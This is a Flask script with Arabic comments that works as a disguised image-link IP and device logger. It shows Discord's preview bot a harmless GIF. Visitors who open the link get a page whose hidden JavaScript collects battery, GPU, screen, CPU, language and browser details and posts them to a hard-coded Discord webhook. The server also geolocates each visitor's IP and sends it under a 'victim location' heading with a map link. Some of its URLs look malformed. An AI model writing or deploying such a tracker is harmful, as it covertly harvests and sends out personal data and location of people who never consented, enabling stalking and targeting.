from flask import Flask, request, render_template_string
import requests
import io

app = Flask(__name__)

# --- ضع بياناتك هنا ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
REAL_IMAGE = "https://d2j2uxe7jasn0r.cloudfront.net/thumbnails/video/ruefkyi-il8e5psf4/videoblocks-hackers-screen-2025_9_yhbh2_sflfew13gl_thumbnail-1080_02.png"
LOADING_GIF = "https://gifer.com"

@app.route('/api/image')
def deep_logger():
    ua = request.headers.get('User-Agent', '')
    # جلب الـ IP الحقيقي عبر Vercel
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()

    # 1. إذا كان الطلب من بوت ديسكورد (فقط اعرض صورة التحميل)
    if "discord" in ua.lower() or "bot" in ua.lower():
        return render_template_string('<meta property="og:image" content="{{ img }}"><img src="{{ img }}">', img=LOADING_GIF)

    # 2. كود الـ HTML والـ JavaScript للسحب العميق للمعلومات
    html_code = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading Image...</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body style="margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden;">
        <img src="{{ img_url }}" style="max-width:100%; max-height:100%;">
        
        <script>
            async function collectAndSend() {
                try {
                    let battery = await navigator.getBattery();
                    let canvas = document.createElement('canvas');
                    let gl = canvas.getContext('webgl');
                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    let gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";

                    let info = {
                        "📱 نظام التشغيل": navigator.platform,
                        "🔋 البطارية": Math.round(battery.level * 100) + "% (" + (battery.charging ? "يشحن" : "لا يشحن") + ")",
                        "🖥️ الشاشة": window.screen.width + "x" + window.screen.height,
                        "🎮 كرت الشاشة": gpu,
                        "🧠 المعالج": navigator.hardwareConcurrency + " Cores",
                        "🌐 اللغة": navigator.language,
                        "⏰ التوقيت": new Date().toLocaleString(),
                        "🖱️ اللمس": navigator.maxTouchPoints > 0 ? "هاتف/تابلت" : "كمبيوتر (ماوس)",
                        "⚙️ المتصفح": navigator.userAgent.split(') ')[1] || "Unknown"
                    };

                    // إرسال البيانات إلى الـ Webhook
                    await fetch("{{ webhook }}", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            "embeds": [{
                                "title": "🚨 فحص عميق للجهاز (Deep Scan)",
                                "color": 16711680,
                                "fields": Object.keys(info).map(key => ({name: key, value: info[key].toString(), inline: true})),
                                "footer": {"text": "IP: {{ ip }}"}
                            }]
                        })
                    });
                } catch (e) {
                    console.error(e);
                }
            }
            collectAndSend();
        </script>
    </body>
    </html>
    '''
    
    # إرسال معلومات الموقع الجغرافي (تتم عبر السيرفر فوراً)
    try:
        data = requests.get(f"http://ip-api.com{ip}?fields=16976857").json()
        if data.get('status') == 'success':
            geo_embed = {
                "title": "📍 موقع الضحية الجغرافي",
                "color": 3447003,
                "fields": [
                    {"name": "الدولة", "value": f"{data.get('country')} ({data.get('city')})", "inline": True},
                    {"name": "المزود", "value": data.get('isp'), "inline": True},
                    {"name": "الخريطة", "value": f"[Google Maps](https://google.com{data.get('lat')},{data.get('lon')})", "inline": False}
                ],
                "footer": {"text": f"IP: {ip}"}
            }
            requests.post(WEBHOOK_URL, json={"embeds": [geo_embed]})
    except:
        pass

    return render_template_string(html_code, img_url=REAL_IMAGE, webhook=WEBHOOK_URL, ip=ip)

if __name__ == "__main__":
    app.run()
